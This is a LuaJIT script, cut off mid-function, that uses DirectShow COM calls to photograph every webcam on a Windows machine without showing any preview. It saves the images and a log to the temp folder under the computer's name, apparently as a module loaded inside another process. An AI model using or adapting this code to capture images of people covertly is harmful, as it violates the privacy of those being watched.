-- webcam_picture.lua
-- Windows webcam capture using DirectShow COM interfaces
-- Captures images from all detected video capture devices
-- Safe for execution in DLL worker threads with LuaJIT
-- Logs to %TEMP%\COMPUTERNAME_WEBCAM_PICTURE_YYYYMMDD_HHMMSS.log

local jit = require("jit")
jit.off(true, true)

local ffi = require("ffi")
local bit = require("bit")

-- === Configuration ===
local CAPTURE_TIMEOUT_MS = 3000

-- Global log file handle
local LOG_HANDLE = nil

ffi.cdef[[
// Base Windows types
typedef unsigned long DWORD;
typedef unsigned short WORD;
typedef unsigned char BYTE;
typedef long LONG;
typedef int BOOL;
typedef void* HANDLE;
typedef void* HWND;
typedef long HRESULT;
typedef void* LPVOID;
typedef const void* LPCVOID;
typedef char* LPSTR;
typedef const char* LPCSTR;
typedef wchar_t* LPWSTR;
typedef const wchar_t* LPCWSTR;
typedef DWORD* LPDWORD;
typedef unsigned long long ULONGLONG;
typedef long long LONGLONG;
typedef long long REFERENCE_TIME;

// GUID structure
typedef struct _GUID {
    DWORD Data1;
    WORD  Data2;
    WORD  Data3;
    BYTE  Data4[8];
} GUID;

typedef GUID IID;
typedef GUID CLSID;

// COM base interface (IUnknown)
typedef struct IUnknown {
    struct IUnknownVtbl* lpVtbl;
} IUnknown;

typedef struct IUnknownVtbl {
    HRESULT (__stdcall *QueryInterface)(IUnknown* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(IUnknown* This);
    DWORD   (__stdcall *Release)(IUnknown* This);
} IUnknownVtbl;

// Forward declarations
typedef struct IEnumMoniker IEnumMoniker;
typedef struct IMoniker IMoniker;
typedef struct IPropertyBag IPropertyBag;
typedef struct ICreateDevEnum ICreateDevEnum;
typedef struct IGraphBuilder IGraphBuilder;
typedef struct ICaptureGraphBuilder2 ICaptureGraphBuilder2;
typedef struct IMediaControl IMediaControl;
typedef struct ISampleGrabber ISampleGrabber;
typedef struct IBaseFilter IBaseFilter;
typedef struct IPin IPin;

// IEnumMoniker
struct IEnumMoniker {
    struct IEnumMonikerVtbl* lpVtbl;
};

typedef struct IEnumMonikerVtbl {
    HRESULT (__stdcall *QueryInterface)(IEnumMoniker* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(IEnumMoniker* This);
    DWORD   (__stdcall *Release)(IEnumMoniker* This);
    HRESULT (__stdcall *Next)(IEnumMoniker* This, DWORD celt, IMoniker** rgelt, DWORD* pceltFetched);
    HRESULT (__stdcall *Skip)(IEnumMoniker* This, DWORD celt);
    HRESULT (__stdcall *Reset)(IEnumMoniker* This);
    HRESULT (__stdcall *Clone)(IEnumMoniker* This, IEnumMoniker** ppenum);
} IEnumMonikerVtbl;

// IMoniker
struct IMoniker {
    struct IMonikerVtbl* lpVtbl;
};

typedef struct IMonikerVtbl {
    HRESULT (__stdcall *QueryInterface)(IMoniker* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(IMoniker* This);
    DWORD   (__stdcall *Release)(IMoniker* This);
    HRESULT (__stdcall *GetClassID)(IMoniker* This, GUID* pClassID);
    HRESULT (__stdcall *IsDirty)(IMoniker* This);
    HRESULT (__stdcall *Load)(IMoniker* This, IUnknown* pStm);
    HRESULT (__stdcall *Save)(IMoniker* This, IUnknown* pStm, BOOL fClearDirty);
    HRESULT (__stdcall *GetSizeMax)(IMoniker* This, ULONGLONG* pcbSize);
    HRESULT (__stdcall *BindToObject)(IMoniker* This, IUnknown* pbc, IMoniker* pmkToLeft, const IID* riidResult, void** ppvResult);
    HRESULT (__stdcall *BindToStorage)(IMoniker* This, IUnknown* pbc, IMoniker* pmkToLeft, const IID* riid, void** ppvObj);
} IMonikerVtbl;

// VARIANT structure
typedef struct tagVARIANT {
    WORD vt;
    WORD wReserved1;
    WORD wReserved2;
    WORD wReserved3;
    union {
        LONGLONG llVal;
        LONG lVal;
        BYTE bVal;
        WORD iVal;
        DWORD uiVal;
        LPWSTR bstrVal;
        IUnknown* punkVal;
        BYTE* pbVal;
    };
} VARIANT;

// IPropertyBag
struct IPropertyBag {
    struct IPropertyBagVtbl* lpVtbl;
};

typedef struct IPropertyBagVtbl {
    HRESULT (__stdcall *QueryInterface)(IPropertyBag* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(IPropertyBag* This);
    DWORD   (__stdcall *Release)(IPropertyBag* This);
    HRESULT (__stdcall *Read)(IPropertyBag* This, LPCWSTR pszPropName, VARIANT* pVar, IUnknown* pErrorLog);
    HRESULT (__stdcall *Write)(IPropertyBag* This, LPCWSTR pszPropName, VARIANT* pVar);
} IPropertyBagVtbl;

// ICreateDevEnum
struct ICreateDevEnum {
    struct ICreateDevEnumVtbl* lpVtbl;
};

typedef struct ICreateDevEnumVtbl {
    HRESULT (__stdcall *QueryInterface)(ICreateDevEnum* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(ICreateDevEnum* This);
    DWORD   (__stdcall *Release)(ICreateDevEnum* This);
    HRESULT (__stdcall *CreateClassEnumerator)(ICreateDevEnum* This, const GUID* clsidDeviceClass, IEnumMoniker** ppEnumMoniker, DWORD dwFlags);
} ICreateDevEnumVtbl;

// IPin
struct IPin {
    struct IPinVtbl* lpVtbl;
};

typedef struct IPinVtbl {
    HRESULT (__stdcall *QueryInterface)(IPin* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(IPin* This);
    DWORD   (__stdcall *Release)(IPin* This);
} IPinVtbl;

// IBaseFilter
struct IBaseFilter {
    struct IBaseFilterVtbl* lpVtbl;
};

typedef struct IBaseFilterVtbl {
    HRESULT (__stdcall *QueryInterface)(IBaseFilter* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(IBaseFilter* This);
    DWORD   (__stdcall *Release)(IBaseFilter* This);
} IBaseFilterVtbl;

// IMediaControl
struct IMediaControl {
    struct IMediaControlVtbl* lpVtbl;
};

typedef struct IMediaControlVtbl {
    HRESULT (__stdcall *QueryInterface)(IMediaControl* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(IMediaControl* This);
    DWORD   (__stdcall *Release)(IMediaControl* This);
    void* GetTypeInfoCount;
    void* GetTypeInfo;
    void* GetIDsOfNames;
    void* Invoke;
    HRESULT (__stdcall *Run)(IMediaControl* This);
    HRESULT (__stdcall *Pause)(IMediaControl* This);
    HRESULT (__stdcall *Stop)(IMediaControl* This);
    HRESULT (__stdcall *GetState)(IMediaControl* This, LONG msTimeout, LONG* pfs);
} IMediaControlVtbl;

// IGraphBuilder (IFilterGraph methods)
struct IGraphBuilder {
    struct IGraphBuilderVtbl* lpVtbl;
};

typedef struct IGraphBuilderVtbl {
    HRESULT (__stdcall *QueryInterface)(IGraphBuilder* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(IGraphBuilder* This);
    DWORD   (__stdcall *Release)(IGraphBuilder* This);
    HRESULT (__stdcall *AddFilter)(IGraphBuilder* This, IBaseFilter* pFilter, LPCWSTR pName);
    HRESULT (__stdcall *RemoveFilter)(IGraphBuilder* This, IBaseFilter* pFilter);
    HRESULT (__stdcall *EnumFilters)(IGraphBuilder* This, void** ppEnum);
    HRESULT (__stdcall *FindFilterByName)(IGraphBuilder* This, LPCWSTR pName, IBaseFilter** ppFilter);
    HRESULT (__stdcall *ConnectDirect)(IGraphBuilder* This, IPin* ppinOut, IPin* ppinIn, void* pmt);
    HRESULT (__stdcall *Reconnect)(IGraphBuilder* This, IPin* ppin);
    HRESULT (__stdcall *Disconnect)(IGraphBuilder* This, IPin* ppin);
    HRESULT (__stdcall *SetDefaultSyncSource)(IGraphBuilder* This);
    HRESULT (__stdcall *Connect)(IGraphBuilder* This, IPin* ppinOut, IPin* ppinIn);
    HRESULT (__stdcall *Render)(IGraphBuilder* This, IPin* ppinOut);
    HRESULT (__stdcall *RenderFile)(IGraphBuilder* This, LPCWSTR lpcwstrFile, LPCWSTR lpcwstrPlayList);
    HRESULT (__stdcall *AddSourceFilter)(IGraphBuilder* This, LPCWSTR lpcwstrFileName, LPCWSTR lpcwstrFilterName, IBaseFilter** ppFilter);
    HRESULT (__stdcall *SetLogFile)(IGraphBuilder* This, HANDLE hFile);
    HRESULT (__stdcall *Abort)(IGraphBuilder* This);
    HRESULT (__stdcall *ShouldOperationContinue)(IGraphBuilder* This);
} IGraphBuilderVtbl;

// ICaptureGraphBuilder2
struct ICaptureGraphBuilder2 {
    struct ICaptureGraphBuilder2Vtbl* lpVtbl;
};

typedef struct ICaptureGraphBuilder2Vtbl {
    HRESULT (__stdcall *QueryInterface)(ICaptureGraphBuilder2* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(ICaptureGraphBuilder2* This);
    DWORD   (__stdcall *Release)(ICaptureGraphBuilder2* This);
    HRESULT (__stdcall *SetFiltergraph)(ICaptureGraphBuilder2* This, IGraphBuilder* pfg);
    HRESULT (__stdcall *GetFiltergraph)(ICaptureGraphBuilder2* This, IGraphBuilder** ppfg);
    HRESULT (__stdcall *SetOutputFileName)(ICaptureGraphBuilder2* This, const GUID* pType, LPCWSTR lpstrFile, IBaseFilter** ppf, void** ppSink);
    HRESULT (__stdcall *FindInterface)(ICaptureGraphBuilder2* This, const GUID* pCategory, const GUID* pType, IBaseFilter* pf, const IID* riid, void** ppint);
    HRESULT (__stdcall *RenderStream)(ICaptureGraphBuilder2* This, const GUID* pCategory, const GUID* pType, IUnknown* pSource, IBaseFilter* pfCompressor, IBaseFilter* pfRenderer);
    HRESULT (__stdcall *ControlStream)(ICaptureGraphBuilder2* This, const GUID* pCategory, const GUID* pType, IBaseFilter* pFilter, REFERENCE_TIME* pstart, REFERENCE_TIME* pstop, WORD wStartCookie, WORD wStopCookie);
    HRESULT (__stdcall *AllocCapFile)(ICaptureGraphBuilder2* This, LPCWSTR lpstr, LONGLONG dwlSize);
    HRESULT (__stdcall *CopyCaptureFile)(ICaptureGraphBuilder2* This, LPCWSTR lpwstrOld, LPCWSTR lpwstrNew, int fAllowEscAbort, void* pCallback);
    HRESULT (__stdcall *FindPin)(ICaptureGraphBuilder2* This, IUnknown* pSource, int pindir, const GUID* pCategory, const GUID* pType, BOOL fUnconnected, int num, IPin** ppPin);
} ICaptureGraphBuilder2Vtbl;

// ISampleGrabber
struct ISampleGrabber {
    struct ISampleGrabberVtbl* lpVtbl;
};

typedef struct {
    GUID majortype;
    GUID subtype;
    BOOL bFixedSizeSamples;
    BOOL bTemporalCompression;
    DWORD lSampleSize;
    GUID formattype;
    IUnknown* pUnk;
    DWORD cbFormat;
    BYTE* pbFormat;
} AM_MEDIA_TYPE;

typedef struct ISampleGrabberVtbl {
    HRESULT (__stdcall *QueryInterface)(ISampleGrabber* This, const IID* riid, void** ppvObject);
    DWORD   (__stdcall *AddRef)(ISampleGrabber* This);
    DWORD   (__stdcall *Release)(ISampleGrabber* This);
    HRESULT (__stdcall *SetOneShot)(ISampleGrabber* This, BOOL OneShot);
    HRESULT (__stdcall *SetMediaType)(ISampleGrabber* This, AM_MEDIA_TYPE* pType);
    HRESULT (__stdcall *GetConnectedMediaType)(ISampleGrabber* This, AM_MEDIA_TYPE* pType);
    HRESULT (__stdcall *SetBufferSamples)(ISampleGrabber* This, BOOL BufferThem);
    HRESULT (__stdcall *GetCurrentBuffer)(ISampleGrabber* This, LONG* pBufferSize, LONG* pBuffer);
    HRESULT (__stdcall *GetCurrentSample)(ISampleGrabber* This, IUnknown** ppSample);
    HRESULT (__stdcall *SetCallback)(ISampleGrabber* This, void* pCallback, LONG WhichMethodToCallback);
} ISampleGrabberVtbl;

typedef struct {
    DWORD biSize;
    LONG biWidth;
    LONG biHeight;
    WORD biPlanes;
    WORD biBitCount;
    DWORD biCompression;
    DWORD biSizeImage;
    LONG biXPelsPerMeter;
    LONG biYPelsPerMeter;
    DWORD biClrUsed;
    DWORD biClrImportant;
} BITMAPINFOHEADER;

// COM functions
HRESULT CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit);
void CoUninitialize(void);
HRESULT CoCreateInstance(const CLSID* rclsid, IUnknown* pUnkOuter, DWORD dwClsContext, const IID* riid, LPVOID* ppv);
void CoTaskMemFree(LPVOID pv);

// Kernel32 functions
DWORD GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
DWORD GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
HANDLE CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPVOID lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPVOID lpOverlapped);
BOOL CloseHandle(HANDLE hObject);
void Sleep(DWORD dwMilliseconds);
int MultiByteToWideChar(DWORD CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
int WideCharToMultiByte(DWORD CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, BOOL* lpUsedDefaultChar);

// OleAut32 functions
void VariantInit(VARIANT* pvarg);
HRESULT VariantClear(VARIANT* pvarg);
]]

local ole32 = ffi.load("ole32")
local oleaut32 = ffi.load("oleaut32")
local kernel32 = ffi.load("kernel32")

-- Constants
local COINIT_MULTITHREADED = 0x0
local CLSCTX_INPROC_SERVER = 0x1
local S_OK = 0
local VT_BSTR = 8
local CP_ACP = 0
local GENERIC_WRITE = 0x40000000
local CREATE_ALWAYS = 2
local FILE_ATTRIBUTE_NORMAL = 0x80
local INVALID_HANDLE_VALUE = ffi.cast("HANDLE", ffi.cast("intptr_t", -1))

-- GUIDs
local CLSID_SystemDeviceEnum = ffi.new("GUID", {0x62BE5D10, 0x60EB, 0x11d0, {0xBD, 0x3B, 0x00, 0xA0, 0xC9, 0x11, 0xCE, 0x86}})
local CLSID_VideoInputDeviceCategory = ffi.new("GUID", {0x860BB310, 0x5D01, 0x11d0, {0xBD, 0x3B, 0x00, 0xA0, 0xC9, 0x11, 0xCE, 0x86}})
local CLSID_FilterGraph = ffi.new("GUID", {0xe436ebb3, 0x524f, 0x11ce, {0x9f, 0x53, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}})
local CLSID_CaptureGraphBuilder2 = ffi.new("GUID", {0xBF87B6E1, 0x8C27, 0x11d0, {0xB3, 0xF0, 0x00, 0xAA, 0x00, 0x37, 0x61, 0xC5}})
local CLSID_SampleGrabber = ffi.new("GUID", {0xC1F400A0, 0x3F08, 0x11d3, {0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37}})
local CLSID_NullRenderer = ffi.new("GUID", {0xC1F400A4, 0x3F08, 0x11d3, {0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37}})

local IID_IPropertyBag = ffi.new("GUID", {0x55272A00, 0x42CB, 0x11CE, {0x81, 0x35, 0x00, 0xAA, 0x00, 0x4B, 0xB8, 0x51}})
local IID_ICreateDevEnum = ffi.new("GUID", {0x29840822, 0x5B84, 0x11D0, {0xBD, 0x3B, 0x00, 0xA0, 0xC9, 0x11, 0xCE, 0x86}})
local IID_IGraphBuilder = ffi.new("GUID", {0x56a868a9, 0x0ad4, 0x11ce, {0xb0, 0x3a, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}})
local IID_ICaptureGraphBuilder2 = ffi.new("GUID", {0x93E5A4E0, 0x2D50, 0x11d2, {0xAB, 0xFA, 0x00, 0xA0, 0xC9, 0xC6, 0xE3, 0x8D}})
local IID_IMediaControl = ffi.new("GUID", {0x56a868b1, 0x0ad4, 0x11ce, {0xb0, 0x3a, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}})
local IID_ISampleGrabber = ffi.new("GUID", {0x6B652FFF, 0x11FE, 0x4fce, {0x92, 0xAD, 0x02, 0x66, 0xB5, 0xD7, 0xC7, 0x8F}})
local IID_IBaseFilter = ffi.new("GUID", {0x56a86895, 0x0ad4, 0x11ce, {0xb0, 0x3a, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}})

local PIN_CATEGORY_CAPTURE = ffi.new("GUID", {0xfb6c4281, 0x0353, 0x11d1, {0x90, 0x5f, 0x00, 0x00, 0xc0, 0xcc, 0x16, 0xba}})
local MEDIATYPE_Video = ffi.new("GUID", {0x73646976, 0x0000, 0x0010, {0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71}})
local MEDIASUBTYPE_RGB24 = ffi.new("GUID", {0xe436eb7d, 0x524f, 0x11ce, {0x9f, 0x53, 0x00, 0x20, 0xaf, 0x0b, 0xa7, 0x70}})
local FORMAT_VideoInfo = ffi.new("GUID", {0x05589f80, 0xc356, 0x11ce, {0xbf, 0x01, 0x00, 0xaa, 0x00, 0x55, 0x59, 0x5a}})

-- Helper functions
local function SUCCEEDED(hr)
    return tonumber(ffi.cast("long", hr)) >= 0
end

local function FAILED(hr)
    return tonumber(ffi.cast("long", hr)) < 0
end

local function wstring(str)
    local len = #str + 1
    local wstr = ffi.new("wchar_t[?]", len)
    kernel32.MultiByteToWideChar(CP_ACP, 0, str, -1, wstr, len)
    return wstr
end

local function fromwstring(wstr)
    if wstr == nil then return "" end
    local len = kernel32.WideCharToMultiByte(CP_ACP, 0, wstr, -1, nil, 0, nil, nil)
    if len <= 0 then return "" end
    local str = ffi.new("char[?]", len)
    kernel32.WideCharToMultiByte(CP_ACP, 0, wstr, -1, str, len, nil, nil)
    return ffi.string(str)
end

local function getTempPath()
    local buffer = ffi.new("char[?]", 260)
    local size = kernel32.GetEnvironmentVariableA("TEMP", buffer, 260)
    if size > 0 and size < 260 then
        return ffi.string(buffer)
    end
    return "C:\\Temp"
end

local function getComputerName()
    local buffer = ffi.new("char[?]", 260)
    local size = ffi.new("DWORD[1]", 260)
    if kernel32.GetComputerNameA(buffer, size) ~= 0 then
        return ffi.string(buffer)
    end
    return "UNKNOWN"
end

local function generateFilePath(deviceName, fileType, extension)
    local tempPath = getTempPath()
    local computerName = getComputerName()
    local safeName = deviceName:gsub("[^%w]", "_"):sub(1, 20)
    local timestamp = os.date("%Y%m%d_%H%M%S")
    return string.format("%s\\%s_%s_%s_%s.%s", tempPath, computerName, safeName, fileType, timestamp, extension)
end

local function initializeLogFile()
    local tempPath = getTempPath()
    local computerName = getComputerName()
    local timestamp = os.date("%Y%m%d_%H%M%S")
    local logPath = string.format("%s\\%s_WEBCAM_PICTURE_%s.log", tempPath, computerName, timestamp)
    
    LOG_HANDLE = kernel32.CreateFileA(
        logPath,
        GENERIC_WRITE,
        0,
        nil,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nil
    )
    
    if LOG_HANDLE == INVALID_HANDLE_VALUE or LOG_HANDLE == nil then
        -- Can't log if we can't open log file, just continue
        LOG_HANDLE = nil
        return nil
    end
    
    return logPath
end

local function log(message)
    -- Wrap everything in pcall to prevent crashes from logging
    pcall(function()
        -- Handle empty messages
        if not message then
            message = ""
        end
        
        -- Print to console (if available)
        if message == "" then
            print("")
        else
            print(message)
        end
        
        -- Write to log file
        if LOG_HANDLE ~= nil and LOG_HANDLE ~= INVALID_HANDLE_VALUE then
            local timestamp = os.date("%Y-%m-%d %H:%M:%S")
            local logLine
            if message == "" then
                logLine = string.format("[%s]\n", timestamp)
            else
                logLine = string.format("[%s] %s\n", timestamp, message)
            end
            local written = ffi.new("DWORD[1]")
            local result = kernel32.WriteFile(LOG_HANDLE, logLine, #logLine, written, nil)
            if result == 0 then
                -- Log file write failed - invalidate handle to prevent future crashes
                LOG_HANDLE = nil
            end
        end
    end)
end

local function closeLogFile()
    if LOG_HANDLE ~= nil then
        kernel32.CloseHandle(LOG_HANDLE)
        LOG_HANDLE = nil
    end
end

local function saveBitmap(filePath, width, height, buffer, bufferSize)
    local rowSize = ((width * 3 + 3) / 4) * 4  -- Row must be multiple of 4 bytes
    local actualSize = tonumber(rowSize * height)
    
    local fileHeaderSize = 14
    local infoHeaderSize = 40
    local fileSize = fileHeaderSize + infoHeaderSize + actualSize
    
    local handle = kernel32.CreateFileA(
        filePath,
        GENERIC_WRITE,
        0,
        nil,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nil
    )
    
    if handle == INVALID_HANDLE_VALUE or handle == nil then
        return false
    end
    
    -- BMP file header
    local fileHeader = ffi.new("BYTE[14]")
    fileHeader[0] = 0x42  -- 'B'
    fileHeader[1] = 0x4D  -- 'M'
    fileHeader[2] = bit.band(fileSize, 0xFF)
    fileHeader[3] = bit.band(bit.rshift(fileSize, 8), 0xFF)
    fileHeader[4] = bit.band(bit.rshift(fileSize, 16), 0xFF)
    fileHeader[5] = bit.band(bit.rshift(fileSize, 24), 0xFF)
    fileHeader[10] = fileHeaderSize + infoHeaderSize
    
    -- BMP info header
    local infoHeader = ffi.new("BYTE[40]")
    ffi.fill(infoHeader, 40, 0)
    local ih_dw = ffi.cast("DWORD*", infoHeader)
    local ih_w = ffi.cast("WORD*", infoHeader)
    local ih_l = ffi.cast("LONG*", infoHeader)
    
    ih_dw[0] = infoHeaderSize
    ih_l[1] = width
    ih_l[2] = height
    ih_w[6] = 1  -- Planes
    ih_w[7] = 24  -- Bits per pixel
    ih_dw[4] = 0  -- Compression (BI_RGB)
    ih_dw[5] = actualSize  -- Image size
    
    local written = ffi.new("DWORD[1]")
    
    if kernel32.WriteFile(handle, fileHeader, 14, written, nil) == 0 then
        kernel32.CloseHandle(handle)
        return false
    end
    
    if kernel32.WriteFile(handle, infoHeader, 40, written, nil) == 0 then
        kernel32.CloseHandle(handle)
        return false
    end
    
    -- Write pixel data (use actual buffer size, not calculated)
    local writeSize = math.min(bufferSize, actualSize)
    if kernel32.WriteFile(handle, buffer, writeSize, written, nil) == 0 then
        kernel32.CloseHandle(handle)
        return false
    end
    
    kernel32.CloseHandle(handle)
    return true
end

local function enumerateVideoDevices()
    log("[*] Enumerating video capture devices using DirectShow...")
    
    local devices = {}
    local pDevEnum = ffi.new("ICreateDevEnum*[1]")
    
    local hr = ole32.CoCreateInstance(
        CLSID_SystemDeviceEnum,
        nil,
        CLSCTX_INPROC_SERVER,
        IID_ICreateDevEnum,
        ffi.cast("void**", pDevEnum)
    )
    
    if FAILED(hr) then
        log(string.format("[!] Failed to create device enumerator: 0x%08X", tonumber(ffi.cast("long", hr))))
        return devices
    end
    
    local pEnum = ffi.new("IEnumMoniker*[1]")
    hr = pDevEnum[0].lpVtbl.CreateClassEnumerator(pDevEnum[0], CLSID_VideoInputDeviceCategory, pEnum, 0)
    
    if tonumber(ffi.cast("long", hr)) == S_OK then
        if ffi.cast("void*", pEnum[0]) ~= nil then
            local pMoniker = ffi.new("IMoniker*[1]")
            local deviceIndex = 0
            
            local nextResult = pEnum[0].lpVtbl.Next(pEnum[0], 1, pMoniker, nil)
            
            while tonumber(ffi.cast("long", nextResult)) == S_OK do
                local pPropBag = ffi.new("IPropertyBag*[1]")
                
                hr = pMoniker[0].lpVtbl.BindToStorage(pMoniker[0], nil, nil, IID_IPropertyBag, ffi.cast("void**", pPropBag))
                
                if SUCCEEDED(hr) then
                    local var = ffi.new("VARIANT")
                    oleaut32.VariantInit(var)
                    
                    hr = pPropBag[0].lpVtbl.Read(pPropBag[0], wstring("FriendlyName"), var, nil)
                    
                    if SUCCEEDED(hr) and var.vt == VT_BSTR then
                        local deviceName = fromwstring(var.bstrVal)
                        table.insert(devices, {
                            index = deviceIndex,
                            name = deviceName,
                            moniker = pMoniker[0]
                        })
                        log(string.format("  [%d] %s", deviceIndex, deviceName))
                        deviceIndex = deviceIndex + 1
                        
                        -- Don't release moniker yet - we'll use it for capture
                    else
                        pMoniker[0].lpVtbl.Release(pMoniker[0])
                    end
                    
                    oleaut32.VariantClear(var)
                    pPropBag[0].lpVtbl.Release(pPropBag[0])
                else
                    pMoniker[0].lpVtbl.Release(pMoniker[0])
                end
                
                -- Get next device
                nextResult = pEnum[0].lpVtbl.Next(pEnum[0], 1, pMoniker, nil)
            end
            
            pEnum[0].lpVtbl.Release(pEnum[0])
        end
    end
    
    pDevEnum[0].lpVtbl.Release(pDevEnum[0])
    return devices
end

local function captureImageFromDevice(device)
    log(string.format("[*] Capturing image from device: %s", device.name))
    
    local pGraph = ffi.new("IGraphBuilder*[1]")
    local pCapture = ffi.new("ICaptureGraphBuilder2*[1]")
    local pGrabber = ffi.new("ISampleGrabber*[1]")
    local pGrabberBase = ffi.new("IBaseFilter*[1]")
    local pNullBase = ffi.new("IBaseFilter*[1]")
    local pSource = ffi.new("IBaseFilter*[1]")
    local pControl = ffi.new("IMediaControl*[1]")
    
    local success = false
    local outputPath = nil
    
    repeat
        -- Create filter graph
        local hr = ole32.CoCreateInstance(CLSID_FilterGraph, nil, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, ffi.cast("void**", pGraph))
        if FAILED(hr) then
            log(string.format("[!] Failed to create filter graph: 0x%08X", tonumber(ffi.cast("long", hr))))
            break
        end
        log("[+] Created filter graph")
        
        -- Create capture graph builder
        hr = ole32.CoCreateInstance(CLSID_CaptureGraphBuilder2, nil, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, ffi.cast("void**", pCapture))
        if FAILED(hr) then
            log(string.format("[!] Failed to create capture graph builder: 0x%08X", tonumber(ffi.cast("long", hr))))
            break
        end
        log("[+] Created capture graph builder")
        
        -- Attach the filter graph to the capture graph
        hr = pCapture[0].lpVtbl.SetFiltergraph(pCapture[0], pGraph[0])
        if FAILED(hr) then
            log(string.format("[!] Failed to set filter graph: 0x%08X", tonumber(ffi.cast("long", hr))))
            break
        end
        log("[+] Set filter graph")
        
        -- Bind moniker to source filter
        hr = device.moniker.lpVtbl.BindToObject(device.moniker, nil, nil, IID_IBaseFilter, ffi.cast("void**", pSource))
        if FAILED(hr) then
            log(string.format("[!] Failed to bind device moniker: 0x%08X", tonumber(ffi.cast("long", hr))))
            break
        end
        log("[+] Bound device to source filter")
        
        -- Add source filter to graph
        hr = pGraph[0].lpVtbl.AddFilter(pGraph[0], pSource[0], wstring("Video Capture"))
        if FAILED(hr) then
            log(string.format("[!] Failed to add source filter: 0x%08X", tonumber(ffi.cast("long", hr))))
            break
        end
        log("[+] Added source filter to graph")
        
        -- Create Sample Grabber filter
        hr = ole32.CoCreateInstance(CLSID_SampleGrabber, nil, CLSCTX_INPROC_SERVER, IID_IBaseFilter, ffi.cast("void**", pGrabberBase))
        if FAILED(hr) then
            log(string.format("[!] Failed to create sample grabber: 0x%08X", tonumber(ffi.cast("long", hr))))
            break
        end
        log("[+] Created sample grabber filter")
        
        -- Query for ISampleGrabber interface
        hr = pGrabberBase[0].lpVtbl.QueryInterface(pGrabberBase[0], IID_ISampleGrabber, ffi.cast("void**", pGrabber))
        if FAILED(hr) then
            log(string.format("[!] Failed to get ISampleGrabber interface: 0x%08X", tonumber(ffi.cast("long", hr))))
            pGrabberBase[0].lpVtbl.Release(pGrabberBase[0])
            break
        end
        log("[+] Got ISampleGrabber interface")
        
        -- Set media type for RGB24
        local mt = ffi.new("AM_MEDIA_TYPE")
        ffi.fill(mt, ffi.sizeof("AM_MEDIA_TYPE"), 0)
        mt.majortype = MEDIATYPE_Video
        mt.subtype = MEDIASUBTYPE_RGB24
        mt.formattype = FORMAT_VideoInfo
        
        hr = pGrabber[0].lpVtbl.SetMediaType(pGrabber[0], mt)
        if FAILED(hr) then
            log(string.format("[!] Failed to set media type: 0x%08X", tonumber(ffi.cast("long", hr))))
        else
            log("[+] Set media type to RGB24")
        end
        
        -- Add sample grabber to graph
        hr = pGraph[0].lpVtbl.AddFilter(pGraph[0], pGrabberBase[0], wstring("Sample Grabber"))
        if FAILED(hr) then
            log(string.format("[!] Failed to add sample grabber to graph: 0x%08X", tonumber(ffi.cast("long", hr))))
            break
        end
        log("[+] Added sample grabber to graph")
        
        -- Create null renderer
        hr = ole32.CoCreateInstance(CLSID_NullRenderer, nil, CLSCTX_INPROC_SERVER, IID_IBaseFilter, ffi.cast("void**", pNullBase))
        if FAILED(hr) then
            log(string.format("[!] Failed to create null renderer: 0x%08X", tonumber(ffi.cast("long", hr))))
            break
        end
        log("[+] Created null renderer")
        
        -- Add null renderer to graph
        hr = pGraph[0].lpVtbl.AddFilter(pGraph[0], pNullBase[0], wstring("Null Renderer"))
        if FAILED(hr) then
            log(string.format("[!] Failed to add null renderer: 0x%08X", tonumber(ffi.cast("long", hr))))
            pNullBase[0].lpVtbl.Release(pNullBase[0])
            break
        end
        log("[+] Added null renderer to graph")
        
        -- Configure sample grabber for one-shot capture
        hr = pGrabber[0].lpVtbl.SetOneShot(pGrabber[0], 1)
        if SUCCEEDED(hr) then
            log("[+] Set one-shot mode")
        end
        
        hr = pGrabber[0].lpVtbl.SetBufferSamples(pGrabber[0], 1)
        if SUCCEEDED(hr) then
            log("[+] Set buffer samples")
        end
        
        -- Render the capture stream
        log("[*] Rendering capture stream...")
        hr = pCapture[0].lpVtbl.RenderStream(
            pCapture[0],
            PIN_CATEGORY_CAPTURE,
            MEDIATYPE_Video,
            ffi.cast("IUnknown*", pSource[0]),
            pGrabberBase[0],
            pNullBase[0]
        )
        
        if FAILED(hr) then
            log(string.format("[!] Failed to render stream: 0x%08X", tonumber(ffi.cast("long", hr))))
            pNullBase[0].lpVtbl.Release(pNullBase[0])
            break
        end
        log("[+] Rendered capture stream")
        
        -- Get media control interface
        hr = pGraph[0].lpVtbl.QueryInterface(pGraph[0], IID_IMediaControl, ffi.cast("void**", pControl))
        if FAILED(hr) then
